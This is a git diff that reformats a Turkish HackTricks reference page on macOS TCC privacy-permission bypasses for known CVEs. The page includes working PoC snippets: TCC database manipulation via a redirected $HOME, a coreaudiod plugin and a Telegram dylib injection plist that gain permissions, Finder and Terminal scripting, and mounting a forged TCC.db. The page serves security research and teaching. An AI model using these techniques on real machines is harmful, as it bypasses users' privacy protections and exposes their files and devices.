@@ -1,4 +1,4 @@
-# macOS TCC Atlatmaları
+# macOS TCC Bypasses
 
 <details>
 
@@ -6,10 +6,10 @@
 
 HackTricks'i desteklemenin diğer yolları:
 
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
+* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** \[**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
 * [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
+* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)\*\* takip edin.\*\*
 * **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
@@ -19,6 +19,7 @@ HackTricks'i desteklemenin diğer yolları:
 ### Yazma Atlatması
 
 Bu bir atlatma değil, sadece TCC'nin nasıl çalıştığıdır: **Yazmayı korumaz**. Terminal **bir kullanıcının Masaüstünü okuma erişimine sahip değilse bile içine yazabilir**:
+
 ```shell-session
 username@hostname ~ % ls Desktop
 ls: Desktop: Operation not permitted
@@ -28,13 +29,14 @@ ls: Desktop: Operation not permitted
 username@hostname ~ % cat Desktop/lalala
 asd
 ```
+
 **Genişletilmiş öznitelik `com.apple.macl`**, **oluşturucu uygulamanın** onu okuma erişimine sahip olması için yeni **dosyaya** eklenir.
 
 ### TCC ClickJacking
 
 Kullanıcıyı **fark etmeden kabul etmesini** sağlamak için TCC uyarısının üzerine bir pencere **yerleştirilebilir**. Bir PoC'yi [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**'de** bulabilirsiniz.
 
-<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>
+<figure><img src="https://github.com/carlospolop/hacktricks/blob/tr/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>
 
 ### Keyfi İsimle TCC İsteği
 
@@ -51,7 +53,7 @@ Daha fazla bilgi ve PoC için:
 
 ### SSH Atlatma
 
-Varsayılan olarak **SSH üzerinden erişim "Tam Disk Erişimi"**ne sahiptir. Bunun devre dışı bırakılması için listelenmiş ancak devre dışı bırakılmış olması gerekir (listeden kaldırmak bu ayrıcalıkları kaldırmaz):
+Varsayılan olarak \*\*SSH üzerinden erişim "Tam Disk Erişimi"\*\*ne sahiptir. Bunun devre dışı bırakılması için listelenmiş ancak devre dışı bırakılmış olması gerekir (listeden kaldırmak bu ayrıcalıkları kaldırmaz):
 
 ![](<../../../../../.gitbook/assets/image (569).png>)
 
@@ -75,7 +77,7 @@ Bu nedenle, bir kullanıcı **tüm uzantıları işlemek için kötü amaçlı b
 
 **iMovie** ve **Garageband** bu ayrıcalığa sahipti ve diğerleri de sahip olabilir.
 
-Bu ayrıcalıktan **iCloud belgelerini almak için** kullanılan açıktan daha fazla **bilgi** için şu konuşmayı kontrol edin: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)
+Bu ayrıcalıktan **iCloud belgelerini almak için** kullanılan açıktan daha fazla **bilgi** için şu konuşmayı kontrol edin: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)
 
 ### kTCCServiceAppleEvents / Otomasyon
 
@@ -108,12 +110,15 @@ end tell
 end tell
 ```
 {% endcode %}
+
 ```bash
 osascript iterm.script
 ```
+
 #### Finder Üzerinden
 
 Veya bir Uygulamanın Finder üzerinden erişimi varsa, şöyle bir betik çalıştırabilir:
+
 ```applescript
 set a_user to do shell script "logname"
 tell application "Finder"
@@ -123,6 +128,7 @@ set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alia
 end tell
 do shell script "rm " & POSIX path of (copyFile as alias)
 ```
+
 ## Uygulama davranışına göre
 
 ### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>
@@ -132,6 +138,7 @@ Kullanıcı alanı **tccd daemon**'ı, TCC kullanıcı veritabanına erişmek i�
 [Şu Stack Exchange gönderisine](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) göre ve TCC daemonı mevcut kullanıcının etki alanı içinde `launchd` aracılığıyla çalıştığından, **tüm çevre değişkenlerini kontrol etmek mümkündür**.\
 Bu nedenle, bir **saldırgan**, **`launchctl`** içinde **`$HOME`** çevre değişkenini kontrol edilen bir **dizine** işaret etmek için ayarlayabilir, **TCC** daemonını **yeniden başlatabilir** ve ardından **TCC veritabanını doğrudan değiştirerek** kendisine **kullanılabilir tüm TCC yetkilerini** vererek son kullanıcıya hiçbir zaman sormadan.\
 PoC:
+
 ```bash
 # reset database just in case (no cheating!)
 $> tccutil reset All
@@ -158,6 +165,7 @@ NULL,
 # list Documents directory without prompting the end user
 $> ls ~/Documents
 ```
+
 ### CVE-2021-30761 - Notlar
 
 Notlar, TCC korumalı konumlara erişime sahipti ancak bir not oluşturulduğunda bu **korumalı olmayan bir konumda oluşturulur**. Bu nedenle, notlara korumalı bir dosyayı bir nota kopyalamasını isteyebilir ve ardından dosyaya erişebilirsiniz:
@@ -190,11 +198,13 @@ Bu **`rename(a, b);`** davranışı bir **Yarış Koşulu**na karşı savunması
 Eğer **`SQLITE_AUTO_TRACE`** ortam değişkeni ayarlanmışsa, **`libsqlite3.dylib`** kütüphanesi tüm SQL sorgularını **günlüğe kaydetmeye** başlayacaktır. Birçok uygulama bu kütüphaneyi kullandığından, tüm SQLite sorgularını günlüğe kaydetmek mümkündü.
 
 Birçok Apple uygulaması, TCC korumalı bilgilere erişmek için bu kütüphaneyi kullanmaktadır.
+
 ```bash
 # Set this env variable everywhere
 launchctl setenv SQLITE_AUTO_TRACE 1
 ```
-### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407
+
+### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407
 
 Bu **çevre değişkeni, çeşitli programların bağımlılığı olan `Metal` çerçevesi tarafından kullanılır**, en önemlisi `Music` programıdır, FDA'ya sahiptir.
 
@@ -284,11 +294,13 @@ Uygulama `/System/Library/CoreServices/Applications/Directory Utility.app`, **`k
 Bu CVE'yi silahlandırmak için, **`NFSHomeDirectory`** (önceki yetkiyi kötüye kullanarak) **değiştirildi**, böylece TCC'yi atlatmak için kullanıcıların TCC veritabanını ele geçirebilmek mümkün hale geldi.
 
 Daha fazla bilgi için [**orijinal rapora**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/) bakın.
+
 ### CVE-2020-29621 - Coreaudiod
 
 **`/usr/sbin/coreaudiod`** ikili dosyasının ayrıcalıkları `com.apple.security.cs.disable-library-validation` ve `com.apple.private.tcc.manager` idi. İlk ayrıcalık **kod enjeksiyonuna izin verirken**, ikinci ayrıcalık ise **TCC'yi yönetme erişimi sağlıyordu**.
 
 Bu ikili dosya, `/Library/Audio/Plug-Ins/HAL` klasöründen **üçüncü taraf eklentileri yüklemeye izin veriyordu**. Bu nedenle, bu PoC ile **bir eklenti yüklemek ve TCC izinlerini kötüye kullanmak mümkündü**:
+
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <Security/Security.h>
@@ -315,6 +327,7 @@ add_tcc_entry();
 NSLog(@"[+] Exploitation finished...");
 exit(0);
 ```
+
 Daha fazla bilgi için [**orijinal rapora**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/) bakın.
 
 ### Aygıt Soyutlama Katmanı (DAL) Eklentileri
@@ -328,6 +341,7 @@ Birçok Apple uygulaması buna karşı savunmasızdı.
 ### Firefox
 
 Firefox uygulamasında `com.apple.security.cs.disable-library-validation` ve `com.apple.security.cs.allow-dyld-environment-variables` yetkileri bulunmaktaydı:
+
 ```xml
 codesign -d --entitlements :- /Applications/Firefox.app
 Executable=/Applications/Firefox.app/Contents/MacOS/firefox
@@ -353,6 +367,7 @@ Executable=/Applications/Firefox.app/Contents/MacOS/firefox
 </dict>
 </plist>
 ```
+
 Daha fazla bilgi için bu [**orijinal raporu kontrol edin**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).
 
 ### CVE-2020-10006
@@ -364,6 +379,7 @@ Daha fazla bilgi için bu [**orijinal raporu kontrol edin**](https://wojciechreg
 Telegram'ın **`com.apple.security.cs.allow-dyld-environment-variables`** ve **`com.apple.security.cs.disable-library-validation`** yetkileri vardı, bu nedenle kamerayla kayıt yapma gibi izinlere erişmek mümkündü. [**Payload'ı yazıda bulabilirsiniz**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).
 
 Ortam değişkenini kullanmak için bir kütüphane yüklemek için **özel bir plist** oluşturuldu ve bunu enjekte etmek için **`launchctl`** kullanıldı:
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -393,6 +409,7 @@ Ortam değişkenini kullanmak için bir kütüphane yüklemek için **özel bir 
 ```bash
 launchctl load com.telegram.launcher.plist
 ```
+
 ## Açık çağrılarla
 
 Kumlanmışken bile **`open`** çağrısı yapmak mümkündür.
@@ -402,6 +419,7 @@ Kumlanmışken bile **`open`** çağrısı yapmak mümkündür.
 Terminal'e **Tam Disk Erişimi (TDE)** vermek oldukça yaygındır, en azından teknik kişiler tarafından kullanılan bilgisayarlarda. Ve **`.terminal`** betiklerini bu erişimle çağırmak mümkündür.
 
 **`.terminal`** betikleri, **`CommandString`** anahtarında yürütülecek komutla birlikte olan bu örnekteki gibi plist dosyalarıdır:
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
@@ -419,7 +437,9 @@ Terminal'e **Tam Disk Erişimi (TDE)** vermek oldukça yaygındır, en azından 
 </dict>
 </plist>
 ```
+
 Bir uygulama, /tmp gibi bir konumda bir terminal betiği yazabilir ve şu şekilde bir komutla başlatabilir:
+
 ```objectivec
 // Write plist in /tmp/tcc.terminal
 [...]
@@ -430,6 +450,7 @@ task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
 exploit_location]; task.standardOutput = pipe;
 [task launch];
 ```
+
 ## Bağlama Yoluyla
 
 ### CVE-2020-9771 - mount\_apfs TCC atlatma ve ayrıcalık yükseltme
@@ -464,6 +485,7 @@ Daha detaylı bir açıklama [**orijinal raporda bulunabilir**](https://theevilb
 ### CVE-2021-1784 & CVE-2021-30808 - TCC dosyası üzerinden Mount işlemi
 
 TCC DB dosyası korunsa bile, yeni bir TCC.db dosyasını **dizin üzerine mount etmek** mümkündü:
+
 ```bash
 # CVE-2021-1784
 ## Mount over Library/Application\ Support/com.apple.TCC
@@ -473,7 +495,7 @@ hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TC
 ## Mount over ~/Library
 hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
 ```
-{% endcode %}
+
 ```python
 # This was the python function to create the dmg
 def create_dmg():
@@ -484,6 +506,7 @@ os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
 os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
 os.system("hdiutil detach /tmp/mnt 1>/dev/null")
 ```
+
 **Tam exploit**'i [**orijinal yazıda**](https://theevilbit.github.io/posts/cve-2021-30808/) kontrol edin.
 
 ### asr
